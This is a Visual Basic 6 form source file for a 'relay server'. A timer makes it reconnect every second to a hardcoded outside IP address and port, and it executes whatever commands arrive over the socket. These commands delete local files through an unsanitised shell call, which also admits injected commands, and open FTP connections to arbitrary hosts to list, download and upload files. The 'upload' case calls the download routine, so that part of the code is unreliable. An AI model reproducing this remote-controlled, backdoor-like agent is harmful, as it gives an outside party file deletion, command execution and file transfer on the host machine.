VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form FRMRelayServer 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Form2"
   ClientHeight    =   3195
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   4680
   LinkTopic       =   "Form2"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3195
   ScaleWidth      =   4680
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer1 
      Interval        =   1000
      Left            =   3720
      Top             =   960
   End
   Begin VB.ComboBox CBOIP 
      Height          =   315
      Left            =   120
      TabIndex        =   0
      Text            =   "80.4.206.174"
      Top             =   180
      Width           =   1695
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   3240
      Top             =   960
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label LBLStatus 
      Caption         =   "Not Connected"
      Height          =   255
      Left            =   2040
      TabIndex        =   1
      Top             =   240
      Width           =   2055
   End
End
Attribute VB_Name = "FRMRelayServer"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private vNextClientNumber As Long

Private vFTPClient(10) As FRMFTPClient

Public Sub SendReply(pName As String)
    Call Winsock1.SendData(pName)
End Sub


Private Sub Timer1_Timer()
    ' attempt to connect to server
    If (Winsock1.State <> 7) Then
        Call Winsock1.Connect(CBOIP.Text, 100)
    End If
End Sub

Private Sub Winsock1_Connect()
    LBLStatus.Caption = "Connected"
End Sub

Private Sub processCommand(pCommand As String)
    Dim Number As Long
    Dim Command As String
    Dim Parameters As String
    
    Dim Path As String
    Dim FileName As String
      
    Dim tempstring As String
    tempstring = pCommand
    Number = Left$(tempstring, InStr(tempstring, "-") - 1)
    tempstring = Mid$(tempstring, InStr(tempstring, "-") + 1)
    Command = Left$(tempstring, InStr(tempstring, "-") - 1)
    Parameters = Mid$(tempstring, InStr(tempstring, "-") + 1)
    
    Select Case Command
        Case "D" ' Delete local file
            Call Shell("del " & Parameters)
        Case "O" ' open New FTPClient
            Set vFTPClient(vNextClientNumber) = New FRMFTPClient
            Call vFTPClient(vNextClientNumber).SetNumber(vNextClientNumber)
            vNextClientNumber = vNextClientNumber + 1
        Case "CI" ' Client Ip
            Call vFTPClient(Number).SetIP(Parameters)
        Case "CP" ' Client Port
            Call vFTPClient(Number).SetPort(Val(Parameters))
        Case "CO" ' Open Client FTP connection
            Call vFTPClient(Number).Connect
        Case "LL" ' List Path
            Call vFTPClient(Number).List(Parameters)
        Case "CL" ' Close Client FTP connection
            Call vFTPClient(Number).DisConnect
        Case "DL" ' Download file
            Path = Left$(Parameters, InStr(Parameters, "/") - 1)
            FileName = Mid$(Parameters, InStr(Parameters, "/") + 1)
            Call vFTPClient(Number).DownloadFile(Path, FileName)
        Case "UL" ' Upload file
            Path = Left$(Parameters, InStr(Parameters, "/") - 1)
            FileName = Mid$(Parameters, InStr(Parameters, "/") + 1)
            Call vFTPClient(Number).DownloadFile(Path, FileName)
    End Select
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
    Dim Number As Long
    Dim Command As String
    Dim Parameters As String
    
    Dim Path As String
    Dim FileName As String
    
    Dim tempstring As String
    
    Call Winsock1.GetData(tempstring, vbString)
    
    Do While (tempstring <> "")
        Call processCommand(Left$(tempstring, InStr(tempstring, vbCrLf) - 1))
        tempstring = Mid$(tempstring, InStr(tempstring, vbCrLf) + 2)
    Loop
End Sub

